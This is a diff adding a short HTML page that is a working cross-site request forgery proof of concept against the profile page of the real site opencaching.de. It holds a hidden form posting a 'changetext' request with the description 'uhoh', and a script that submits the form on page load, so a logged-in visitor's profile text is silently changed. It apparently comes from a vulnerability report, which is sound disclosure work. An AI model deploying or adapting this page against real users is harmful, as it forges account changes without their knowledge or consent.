@@ -1,0 +1,16 @@
+<html>
+    <body>
+        <form action="https://www.opencaching.de/mydetails.php" method="POST">
+            <input type="hidden" name="action" value=changetext />
+            <input type="hidden" name="descMode" value=3 />
+            <input type="hidden" name="oldDescMode" value=2 />
+            <input type="hidden" name="scrollposx" value=0 />
+            <input type="hidden" name="scrollposy" value=0 />
+            <input type="hidden" name="desctext" value=uhoh />
+            <input type="hidden" name="save" value=Submit />
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
